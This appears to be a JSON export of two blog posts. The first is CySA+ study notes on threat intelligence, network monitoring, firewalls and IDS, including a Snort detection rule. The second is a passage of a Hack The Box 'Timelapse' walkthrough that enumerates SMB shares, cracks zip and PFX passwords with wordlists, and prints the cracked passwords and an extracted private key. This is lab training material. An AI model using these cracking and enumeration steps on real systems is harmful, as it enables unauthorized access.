[ { "title": "CySA+ Preparation Content", "url": "/posts/CySA/", "categories": "CySA, Certifications, BlueTeam", "tags": "", "date": "2023-01-07 07:10:00 +0100", "snippet": "In this post I want to group all the content related with the CySA certification that I considere important and worth to keep in this site. I want to clarify that some important content may not be added because I feel that I already know and it is not worth to spend that extra time.Threat Intelligence SharingSecurity vs Threat IntelligenceSecurity Intelligence is the process through which data generated in the ongoing use of systems is collected, processed, analyzed and disseminated in order to provide a security status of those systems.Threat Intelligence is the process of collecting, investigating, analyzingand disseminating information about emerging threats to obtain an external threat landscape.Intelligence CycleSecurity intelligence is a process. You can see diferents schemas in the internet and they may be a bit different (some of them group steps into a unique step), but the overall idea is the same. Requirements, Planning and Direction: In this phase the goals for the intelligence gathering effort/cycle is set. Collection and Processing: The collection of the data can be done by software tools and SIEMs. Afterwards, this data is processed using Data Enrichment processes with the goal to keep relevant data. Analysis: The analysis of the processed data is performed against the use cases decided from the Requirements, Planning and Directon phase. This step can make use of auto model analysis, using machine learning and artificial intelligence. Dissemination: In ths phase the results obtained by the analysis is published to consumers so other teams can take action. Thei can be classified using the type of intelligence they refere: Strategic Intelligence: related with broad things and objectives. They are usually reports to executives, power point slides, etc. Operational Intelligence: Adresses the day to day priorities of the specialists. Tactical Intelligence: They refere to real time decisions, like alerts detected by the SOC. Review/Feedback: This phase aims to clarify the requirements and improve the the Collection, analysis and dissemination phases for the next cycle by reviewing the current inputs and outputs. Usually the feedback phase takes into account: Lessons learned Measurable success Evolving threat issues Intelligence SourcesThe Collection and Processing step of the Intelligence Cycle, we have to analyze the sources that are used to obtain the data. We should considere this properties of the sources and data: Timeliness: Property of a source that ensures that it is up-to-date. Relevancy: Property of a source that ensures that it matches the use cases intended for it and that the data that the source provides is relevant. Accuracy: Property of a soruce that ensures that the results are accurate and effective. Confidence Levels: Property of a source that ensures the produced statements are reliable.The places where we obtain the data can also be classified: Proprietary: Comercial services offering acces to updates and research data. Close-source: Data obtained from the own provider’s research. Open-Source: Public available data from public databases. US-CERT UK NCSC AT&amp;T Security MISP (Malware Information Sharing Point) Virus Total Spanhaus SANS ISC Suspicious DOmains OSINT ara the methods to obtain information through public records, websites, and social media.ISACS: Intelligence Sharing and Analysis CentersThe ISAC is a non-profit group set to share sector-specific threat intelligence and security best practices (CISP is the same but in the UK). There are diferent types of ISACS, classified using the sector: \t- Critical Infrastructure\t- Goverment\t- Healthcare\t- Financial\t- AviationThreat Intelligence Sharing (within the organitzation)In the Dissemination phase, is important to share the information with the corresponding teams to act according to the situation (make use of the data). Risk Management: Identify, evaluate and prioritizes threats and vulnerabilities to reduce the impact. Incident Response: Organized approach to address security-breach/cyber-attacks. Vulnerability Management: Identify, classify and prioritize software vulnerabilities. Detection and Monitoring: The practice of observing to identify anomalous patterns to analyze them further.Classifying ThreatsTypes of Malware Commodity Malware: This type of malware is available to purchase or it is free. They exploit a known vulnerability. Is used by a wide range of threat actors. Zero-day: Malware that exploits a zero-day vulnerability, which means that is a vulnerability that has just been discovered. APT - Advance Persistent Threats:They are usually performed by Organized Crime and once they obtain access, they mantain it in order to obtain information. The information is obtained by the malware and sent to the Command and Control (C2), a infrastructure of hosts and services with which the attackers direct, distribute and control the malware over bots/zombies (botnets).Threat ResearchThreats used to be identifyed by a signature (part of the threat that is re that allowed them to be recognizable). However, obfuscating techniques have become better and searching for the signature is no longer the best option. Some different ways to identify threats can be: Reputational Threat Research: This consists of a blacklists of known threat sourcesn like signatures, IP addresses ranges and DNS domains. If something is dettected comming from thoose sources, is classified as a threat. Indicator of Compromise (IOC): Thoose are residual signs that an asset or network have been compromised (or is beeing attacked). Modified files, excessive bandwith, unknown port ussage and suspicious emails can be IOC. If the attack is still going on, instead of saying it is a IOC, we will say it is a Indicator of Attack (IOA). Behavioral Thread Research: This detection technique is based on Tactics, Techniques and Procedures used by the threats. They correlate the IOC with attack patterns. Some examples can be: DDoS Viruses and Worms Network Reconnaissance APT Data Exfiltration The C2 that the APT’s use may do Port Hopping technique in order to use different ports and make them more difficult to detect. Another technique that they may use is Fast Flux DNS, which consists on changing the IP address associated with a domain frequently.Attack FrameworksA Kill Chain is a framework that was first introduced by Lockheed Martin (military US company) and it describes the stages bw which a threat actor progresses in a network intrusion attack. Reconnaissance: The attacker determines the methods that will be used to continue with the attack by gathering information about the victim. It can be used Passive or Active information gathering. Weaponization: This is the step were the malware/exploit is developed considering the detected vulnerabilities. Delivery: In this step the method that will be used to introduce the attack will be identified. Explotation: This step occurs when the exploit/malware is successfully introduced. Installation: When the malware gets executed, this step allows to obtain a remotr access tool to the victim and achieve persistance. Comand and Control (C2): Establish a outbound channel to a reomote server (botnet) to progress withthe attack. Actions on Objectives: Attackers make use of the access achieved to collect what they want.The MITRE ATT&amp;CK Framework is a knowledge base that consist of a matrix where different tactics and techniques used by the attacers are described. You can check it here https://attack.mitre.org/matrices/enterprise/.Last but not least, we have the Diamond model of Intrusion Analysis. This framework analyzes the security incidents by exploring the relationship between four features: adversary, capability, infrastructure and victim. This is a complex model, that can also help to create Activity Threads and Activity Attack Graphs. Fore a more detailed information, I suggest reading this post: https://www.socinvestigation.com/threat-intelligence-diamond-model-of-intrusion-analysis/.Indicator ManagementIt is important to use a normalized way when sharing information about threats.STIX (Structured Thread Information eXpression) is a standar terminology for IOCs and a way to indicate relationships between them. It is expressed in JSON. It has objects that contain multiple attributes with their corresponding value: \t- Observed Data\t- Indicator\t- Attack Patterns\t- Campaign agains threat actor\t- Courses of Action (mitigation techniques used to reduce the attack)TAXII (Trusted Automated eXchange of Indicator Information) is a protocol for supplying codified information to aoutomate incident detectiond and analysis. The analysis tools provide updates of the threats using this protocol. OpenIOC is a framework that uses XML files for supplying codified information to automate indicent detection.MISP (Malware Information SHaring Protocol) provides a server platform that allows cyber intelligence sharing. It supports OpenIOC definitions and can receive and send information using STIX over the TAXII protocol.#Threat HuntingThreat hunting is a technique designed to detect presence of threats that have not been discovered by normal security monitoring. Is also less disruptive than a penetration test.Threat ModelingThreat modeling is a structured approach to identifying potential threats and vulnerabilities in a system, network, or application. The goal of threat modeling is to understand the potential attack vectors and to identify and prioritize the risks associated with them. This process typically involves: Identify the attack vectors The impact of the attack in terms of confidentiality, integrity and availability of the data Identify the likelihood of the attack to occur What mitigations can be implementedThe information gathered during threat modeling can then be used to inform security design and implementation decisions.The Adversary Capability can be classified to determine de resources and expertise availabe by the threat actor: Aquired and augmented, Developed, Advanced and IntegratedThe Attack Surface can be classified to determine the points where a network or app receives external connections that can be exploited: Holistic network, Websites and cloud-services and Custom software applications.The Attack Vector is the methodology used by the attackers to gain acces to the network or exploit a gain unauthorized acces: Cyber, Human and Physical.The Likelihood is the chance of a threat being exploited.The Impact is the cost of a security incident. Usually expressed in cost (money).OSINT (Open-Source Intelligence)All the public information and tools that can be used by the attacker to obtain specific data about a victim is classified as OSINT. It can allow the attacker to develop a stretegy for compromising the victim. Here you can find all the OSINT framework with different tools that can be used and public information.Some of the most used and know ones are: Google Hacking: Use Google search advance operators (“”, NOT, AND/OR, and keywors to determine the scope of the search, such as site, flietype, related,…) to locate desired information. You can visit the Google Hacking Database to obtain usefull queries. Shodan: shodan.io is a search engine optimized for identifying vulnerable Internet-attached devices. It can allow you to search, for example, open ssh ports facing the internet without having to do an active scan. Profiling Techniques such as Email Harvesting can be used to try to guess valid and existing email addresses for a specific domain. Harvesting Techniques such as whois command, DNS Zone Transfer (method that asks for a replicated DNS database across a set of DNS servers that will reply if they are missconfigured) and DNS/Web Harvesting are other OSINT tools used to gain information about subdomains, source code, hosting providers, comments in the website code, etc. If you want to know more about OSINT and passive information gathering, you can read this other post Passive Information Gathering that I wrote when I was studying for the OSCP certification.Network ForensicsToolsIn order to analyze network traffic, it must be captured and decoded. Switched Port Analyzer (SPAN): This is a feature that can be activated in a switch. This feature, also known as port mirroring, makes a copy of the traffic seen on a single port or multiple ports and sends the copy to another port (usually a monitoring port which will process the packets). Packet Sniffer: This can be a fisical debice connected to a network or a software program that uses records data frames as they pass over the network. Deppending on the placement of the sniffer inside the network, it will be able to sniff more or less data. Wireshark and tcpdump are software programms that can be used to sniff traffic. Flow AnalysisThere are different ways to analize the flow that you capture: Full Packet Capture (FPC): The entire packet is captured (header+payload). Flow Collector: It just records mettadata and statistics about the traffic blow, but not the traffic itself. NetFlow: This is a standard developed by CISCO and is used to report the nerwork flow into a structured database. It includes: Network protocol interface Version and type of IP Source and destination IP Source and destination port IPs ToS (Type of Service) Zeek: This is a hybrid tool that monitors the network in a passive form and only logs relevant data. The events are stored in JSON format. Multi Router Traffic Grapher (MRTG): This tool creates graphs that show traffic flows through the network interfaces of routers and switches by using SNMP (Simple Network Management Protocol).IP and DNS AnalysisThere are Known-bad IP/DNS addresses, which are range of addresses taht appears in blackists and can help to detect if the traffic is malicious.Recent malware uses Domain Generation Algorithms (DGA) to evade blackists. The purpose of a DGA is to make it harder for security researchers and network defenders to identify and block the C2 servers used by the malware.The algorithm usually uses a seed value and an algorithm to generate a large number of domain names. The seed value can be based on a specific date, time or some other value that is known to both the malware and the C2 server. The algorithm then generates a large number of domain names by applying the seed value to the algorithm.Some of the common techniques used by DGA are:Using a predefined set of words or characters and applying mathematical operations to them.Using encryption functions to generate domain names.Using a combination of words or characters that are unlikely to be registered by legitimate domain owners.Once the domain names are generated, the malware will try to connect to each one of them in a specific order, until it finds the C2 server. The C2 server will then be used to download additional malware, exfiltrate data, or receive commands.A Fast Flux Network (FFN) is another method used by the malware to avoid being detected. FFN is a type of botnet that uses a technique to hide the true location of a command-and-control (C2) server by constantly changing the IP address associated with a specific domain name using a technique known as “fast flux” where the IP address associated with the domain name changes frequently. The malware infects a large number of machines and turns them into “proxies” for the C2 server. The main goal of a FFN is to evade detection by making it difficult to identify and block the C2 server used by the malware.URL AnalysisAnother way to detect a possible attack is to perform a URL Analysis.Percent-encoding, also known as URL encoding, is a technique used to encode special characters, such as spaces, slashes, and ampersands, that are not allowed in URLs so that they can be transmitted safely. It replaces these characters with a percentage sign followed by the ASCII code of the character in hexadecimal form. This technique is also important for preventing cross-site scripting (XSS) attacks by encoding special characters that could be used in an XSS attack so that they are not executed by the browser.Here you can find a list with the more usefull ones: Symbol Representation Encoding ” “ (Space) %20 “&amp;” (Ampersand) %26 ”+” (Plus) %2B ”,” (Comma) %2C ”/” (Forward slash) %2F ”:” (Colon) %3A ”;” (Semi-colon) %3B ”=” (Equals) %3D ”?” (Question mark) %3F ”@” (At sign) %40 ”$” (Dollar sign) %24 ”#” (Pound sign) %23 ”&lt;” (Less than) %3C ”&gt;” (Greater than) %3E ”’” (Single quote) %27 ””” (Double quote) %22 Application MonitoringFirewallsFirewall Logs keep a lot of usefull data that can be used to detect suspicious behaviour. They keep the connections that have been alowed or denyed, the protocols used, the bandwith usage, NAT/PAT translation, etc. The rules that the firewall will follow for deciding the permitted and denied connections will be defined in the Access Control List (ACL)The format of the logs will be vendor specific: iptables This is a Linux based firewall that uses the syslog file format to store the data. The logs have a code that can help to identify the severitoy of log. Code Severity Description 0 Emergency The system is unusable. 1 Alert Action must be taken immediately. 2 Critical Critical conditions. 3 Error Error conditions. 4 Warning Warning conditions. 5 Notice Normal but significant condition. 6 Informational Informational messages. 7 Debug Debug-level messages. Windows Firewall It uses W3C Extended Log File Format. This is a format used by web servers to record information about requests made to the server, while syslog is a standard used to send log messages from network devices to a centralized log server.When a Firewall is under-resourced and logs can’t be collected fast enough, an attacker could exploit this by sending a lot of thata and overwhelming the firewall, hence the traffic can’t be collected properly nor detect unauthorized access. This is known as a Blinding AttackFirewall ConfigurationsIt is important to study where the Firewall will be placed in the network. However, this will be diffent for each use case. Demilitarized Zone DMZ: If your network has servers that exposes services (like web pages) to the Internet, they are usaly in a independent subnetwork, isolated from the internal network of the company. Since thoose services are exposed to the Internet, are more vulnerable and is important to add a separation between them and your other servers/workstations. This DMZ zone usually has a Firewall facing the internet, allowing trafic related with the services exposedand another one between the DMZ and the internal network, more restrictive.It is also important that the ACLs are processed from top-to-bottom, this means that the most specific rules have to be in the top and the generall ones at the end. Some principles for a good ACL configuration are: Block incoming requests from private, loopback and multicast IP address ranges. Block protocols that should only be used locally and not received from the internet, like: ICMP, DHCP, OSPF, SMB. Authorize just known hosts and ports to use IPv6A firewall can DROP a packet or REJECT it. When the deny rule REJECTS the packet, it explicitly sends a response saying that the traffic has been rejected. However DROPPING it will just ignore the packet and the sender won’t receive any answer, which will difficult the work (for example, mapping the ports and network) if it is a malicious adversary. Dropping can be used to create a Black Hole and avoid DoS and DDoS attacks by sending the traffic to the null0 interface and not sending a response.You can also configure your Firewall to send to the Black Hole all unused IP addreses within your network, because they should not be used, and if usage is dettected it is unauthorized.A Sinkhole is like a Black Hole but instead of sending the traffic to the null0 interface, it is redirected to another subnet for further investigation.Is also important to observe the eggress traffic. A host could have been infected by malware and communicating with the internet (Comanda and Control servers). Best practice for configuring egress traffic are: Allow whitelisted apps, ports and destination addresses Restrict DNS lookups to trusted DNS services Block access to known bad IP address ranges (blacklist) Block all internet access from host that don’t use internetProxy LogsA proxy is a server that acts as an intermediary between a client and another server (e.g., a web server). It can be a Forward or Reverse proxy, and they can also be transparent and Nontransparent. Forward Proxy: A forward proxy is a proxy that is used by a client to access resources on a remote server. The client sends a request to the forward proxy, which then forwards the request to the remote server, and returns the server’s response to the client. Imagine a company that makes all its workstations to go through a proxy before going to the internet. This situation will imply a forward proxy. Reverse Proxy: A reverse proxy is a proxy that is used by a server to handle client requests. It is the reverse situation from the forward proxy. Instead of forwarding packets from the clients to the servers, it collects packets received through the internet and redirects to different servers according to the situation. A nontransparent proxy is the proxy that has to be configured in the client browser, specifying the proxy IP and port (for example Burpsuite). A transparent proxy is a type of proxy server that intercepts and forwards requests and responses to the intended destination without the client being aware of it. It is used for caching frequently requested content, blocking certain types of content, translating IP addresses for clients on a private network to access the internet, and requiring authentication for access control. The client does not need to be configured to use it as it operates in a transparent mode.Proxy Logs can be analyzed searching for indicators of attack.Web Application Firewall Logs (WAF)A Web Application Firewall (WAF) is a security tool that protects web applications from malicious attacks by analyzing incoming traffic and comparing it to predefined rules or patterns. If the traffic matches a known attack, such as SQL injection, XML injection, XSS, DoS, etc. the WAF takes action to block the request. It can be implemented as software or hardware, and can be a standalone solution or part of other security products.Usually the WAFs store their logs in JSON format and they contain: \t- Time of event\t- Severity of event\t- URL parameters\t- HTTP method used\t- Context for the ruleIntrusion Detection System (IDS)An IDS is a type of security software or hardware that is designed to detect and alert on unauthorized access or malicious activity on a computer network or system.IDS systems work by continuously monitoring network traffic for suspicious patterns, anomalies, or known malicious activity. They can be set up in two different ways:Network-based IDS (NIDS): These systems monitor all the traffic that flows through a network, looking for suspicious activity. They are placed at strategic points in the network to monitor traffic from all devices connected to the network.Host-based IDS (HIDS): These systems monitor the activity on a single host or device, such as a server or a workstation. They are installed on the host itself, and monitor the system logs, process activity, and other data to detect any suspicious activity.When an IDS detects suspicious activity, it generates an alert or alarm, which can be used to alert network administrators or trigger an automatic response, such as blocking the offending IP address or shutting down the affected service.Intrusion Prevention System (IPS)An IPS is a security technology that is similar to an IDS, but with the added capability to take action to prevent unauthorized access or malicious activity on a computer network or system.The actions that an IPS can take include: Blocking traffic from a specific IP address or network Closing a specific network port Quarantining a device on the network Logging off a userAn IPS is considered more advanced than an IDS, as it can prevent malicious activity from occurring in real-time, rather than just detecting it and raising an alert. However, it’s important to note that IPS systems, like any other security device, can produce false positives and negatives, so it’s crucial to have a well-configured and fine-tuned system to maximize its effectiveness.Snort is an open-source, free, and widely-used Intrusion Detection and Prevention System (IDPS) tool. It can be used as both a network-based IDS (NIDS) and a host-based IDS (HIDS) depending on the configuration.Snort uses a rule-based language to define what it should look for when scanning network traffic. Each rule is made up of several different parts, including: Action: This is the first part of the rule, and it specifies what action Snort should take when the conditions specified in the rule are met. For example, an action can be “alert”, “log”, “pass”, “activate”, “dynamic” among others. Protocol: This specifies the protocol that the rule applies to, such as TCP, UDP, or ICMP. Source and destination IP addresses: These specify the IP addresses that the rule applies to. They can be either a specific IP address or a range of IP addresses. Source and destination ports: These specify the ports that the rule applies to. They can also be either a specific port or a range of ports. Direction: This field specifies the direction of the rule, either “-&gt;” (from source to destination) or “&lt;&gt;” (bidirectional). Options: This field is used to specify additional conditions that Snort should look for, such as specific content in the packet, specific flags set in the packet header, or specific values in the packet payload. Message: This field is used to specify a message that will be displayed when the rule is triggered.An example of a Snort rule:alert tcp $EXTERNAL_NET any -&gt; $HOME_NET 22 (msg:\"SSH Brute Force\"; flow:to_server,established; threshold:type limit,track by_src,count 2,seconds 1; classtype:attempted-recon; sid:10000001; rev:1;)This rule will trigger an alert when it detects a TCP connection coming from the external network to the home network on port 22 (SSH) with the message “SSH Brute Force”. It’s also configured to track the connection by source IP and only trigger the alert when it detects 2 connections in 1 second.Network Access Control (NAC) ConfigurationNetwork access control (NAC) provides the means to authenticate users and evaluate device integrity before a network connection is permitted.IEE 802.1X is a standard for port-based Network Access Control (NAC) that provides a framework for authenticating and controlling access to a network. It is commonly used in wireless networks and wired Ethernet networks to provide a secure connection for devices.The 802.1X protocol works by using a supplicant (the device that wants to connect to the network) and an authenticator (a network device such as a switch or wireless access point) to establish a secure connection.The basic process for 802.1X authentication is as follows: The supplicant (device) attempts to connect to the network. The authenticator (switch or Access Point) receives the connection attempt and sends an EAP-Request/Identity message to the supplicant, requesting the device’s credentials. The supplicant sends an EAP-Response/Identity message containing the device’s credentials (such as username and password) to the authenticator. The authenticator forwards the credentials to an Authentication Server (using RADIUS protocol) to verify the device’s identity. The Authentication Server verifies the credentials and sends an EAP-Response message indicating whether the device is authorized to access the network. If the device is authorized, the authenticator sends an EAP-Success message to the supplicant, allowing the device to access the network.802.1X also supports other types of authentication methods, such as certificate-based authentication and token-based authentication, in addition to the username and password based authentication.All the steps above use EAP messages. However, the communication between the Supplicant and the Authenticator uses EAPOL and the communication between the Authenticator and the Authenticatos Server uses RADIUS.In summary, EAP (Extensible Authentication Protocol) is a framework that defines a standard way to provide authentication and security for wireless networks, EAPOL (EAP over LAN) is a network protocol that is used to carry EAP messages over LANs, and RADIUS (Remote Authentication Dial-In User Service) is a network protocol that is used to authenticate and authorize users attempting to connect to a network. Together, these protocols provide a flexible and secure way to authenticate and control access to a network using 802.1X." }, { "title": "Htb_timelapse", "url": "/posts/HTB_Timelapse/", "categories": "", "tags": "", "date": "2022-08-21 00:00:00 +0200", "snippet": "— title: HTB Timelapse Walktrough author: Adriàdate: 2022-07-16 14:10:00 +0800categories: [HTB]tags: [HTB, Windows, LDAP, SMB]render_with_liquid: false—Scan and EnumerationLet’s start doing a nmap scan. These are the results I obtained:Nmap scan report for 10.10.11.152Host is up (0.11s latency).Not shown: 989 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-05 16:08:19Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ldapssl?3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp open globalcatLDAPssl?Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS fingerprint not ideal because: Missing a closed TCP port so results incompleteNo OS matches for hostNetwork Distance: 2 hopsService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h59m56s| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required| smb2-time: | date: 2022-07-05T16:08:37|_ start_date: N/ATRACEROUTE (using port 445/tcp)HOP RTT ADDRESS1 108.19 ms 10.10.14.12 108.51 ms 10.10.11.152OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 70.56 secondsWe can see that it has some interesting open ports such as kerberos (88), dns (53), ldap (389) and SMB (445). We can assume we are against a Windows DC machine because of the services offered.The next thing I tried was checking some public SMB shares:❯ smbclient --no-pass -L //10.10.11.152Can't load /etc/samba/smb.conf - run testparm to debug it\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tNETLOGON Disk Logon server share \tShares Disk \tSYSVOL Disk Logon server share SMB1 disabled -- no workgroup availableAnd then I tried to check if I had access to them. I was able to access the Shares share and list its content:❯ smbclient //10.10.11.152/SharesCan't load /etc/samba/smb.conf - run testparm to debug itPassword for [WORKGROUP\\adri]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Oct 25 15:39:15 2021 .. D 0 Mon Oct 25 15:39:15 2021 Dev D 0 Mon Oct 25 19:40:06 2021 HelpDesk D 0 Mon Oct 25 15:48:42 2021\t\t6367231 blocks of size 4096. 2062817 blocks availablesmb: \\&gt; I first downloaded the backup file found inside Dev:smb: \\Dev\\&gt; ls . D 0 Mon Oct 25 19:40:06 2021 .. D 0 Mon Oct 25 19:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 15:46:42 2021\t\t6367231 blocks of size 4096. 2085105 blocks availablesmb: \\Dev\\&gt; get winrm_backup.zipgetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)Then I downloaded the other interesting files to inspect them later:smb: \\HelpDesk\\&gt; ls . D 0 Mon Oct 25 15:48:42 2021 .. D 0 Mon Oct 25 15:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 14:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 14:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 14:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 14:57:44 2021\t\t6367231 blocks of size 4096. 2110122 blocks availablesmb: \\HelpDesk\\&gt; get LAPS_Datasheet.docx getting file \\HelpDesk\\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (161.1 KiloBytes/sec) (average 98.1 KiloBytes/sec)smb: \\HelpDesk\\&gt; get LAPS_OperationsGuide.docx getting file \\HelpDesk\\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (669.2 KiloBytes/sec) (average 365.1 KiloBytes/sec)smb: \\HelpDesk\\&gt; get LAPS_TechnicalSpecification.docx getting file \\HelpDesk\\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (162.1 KiloBytes/sec) (average 328.6 KiloBytes/sec)Brute ForcingThis .docx documents contain information about LAPS. The next step I took was to unzip the backup file and check for more sensitive information. However, the file inside this zip was protected by a password. I used Arch Linux and I had an issue cracking this .zip file so I had to download it from Parrot Linux and I used fcrackzip to find the password:$ fcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt ./winrm_backup.zipPASWORD FOUND!!!!: pwd == supremelegacyNow we can unzip it and we can see that there is a .pfx file inside it. A .pfx file contains a SSL certificate and the corresponding private keys:❯ unzip winrm_backup.zipArchive: winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: legacyy_dev_auth.pfx ❯ ls LAPS_Datasheet.docx  LAPS_TechnicalSpecification.docx  walkthrough.md  LAPS_OperationsGuide.docx  legacyy_dev_auth.pfx I wanted to extract the private key using this openssl command: openssl pkcs12 -in legacy_dev_auth.pfx -nocerts -out priv-key.pem -nodes but it required another password. After googling a bit, I decided to try with the crackpkcs12 tool and rockyou.txt to bruteforce the password again:crackpkcs12 -d /home/adri/Desktop/adri/utils/rockyou.txt -v legacyy_dev_auth.pfxDictionary attack - Starting 2 threadsPerformance: 3232878 passwords [ 11732 passwords per second]*********************************************************Dictionary attack - Thread 2 - Password found: thuglegacy*********************************************************Now we can extract the private key and read it:❯ openssl pkcs12 -in certname.pfx -nocerts -out key.pem -nodesCan't open certname.pfx for reading, No such file or directory140137388039040:error:02001002:system library:fopen:No such file or directory:crypto/bio/bss_file.c:69:fopen('certname.pfx','rb')140137388039040:error:2006D080:BIO routines:BIO_new_file:no such file:crypto/bio/bss_file.c:76:❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodesEnter Import Password:❯ ls key.pem  LAPS_OperationsGuide.docx  legacyy_dev_auth.pfx  winrm_backup.zip LAPS_Datasheet.docx  LAPS_TechnicalSpecification.docx  walkthrough.md  zip.hash❯ cat key.pem───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: key.pem───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ Bag Attributes 2 │ Microsoft Local Key set: &lt;No Values&gt; 3 │ localKeyID: 01 00 00 00 4 │ friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b 5 │ Microsoft CSP Name: Microsoft Software Key Storage Provider 6 │ Key Attributes 7 │ X509v3 Key Usage: 90 8 │ -----BEGIN PRIVATE KEY----- 9 │ MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz 10 │ TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to 11 │ pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb 12 │ oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3 13 │ dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2 14 │ qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD 15 │ MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW 16 │ fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j 17 │ PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL 18 │ GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0 19 │ Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU 20 │ Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ 21 │ 7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7 22 │ tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ 23 │ 2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja 24 │ 8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV 25 │ 1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI 26 │ ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o 27 │ btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN 28 │ 71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3 29 │ QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0 30 │ 6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK 31 │ /ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r 32 │ c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X 33 │ TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8 34 │ A5ZZvI+GsHhm0Oab7PEWlRY= 35 │ -----END PRIVATE KEY-----───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────We can also extract the certificate and read the content by doing this other openssl command:❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pemEnter Import Password:❯ ls cert.pem  LAPS_Datasheet.docx  LAPS_TechnicalSpecification.docx  walkthrough.md  zip.hash key.pem  LAPS_OperationsGuide.docx  legacyy_dev_auth.pfx  winrm_backup.zip ❯ cat cert.pem───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: cert.pem───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ Bag Attributes 2 │ localKeyID: 01 00 00 00 3 │ subject=CN = Legacyy 4 │ 5 │ issuer=CN = Legacyy 6 │ 7 │ -----BEGIN CERTIFICATE----- 8 │ MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS 9 │ MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1 10 │ MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC 11 │ 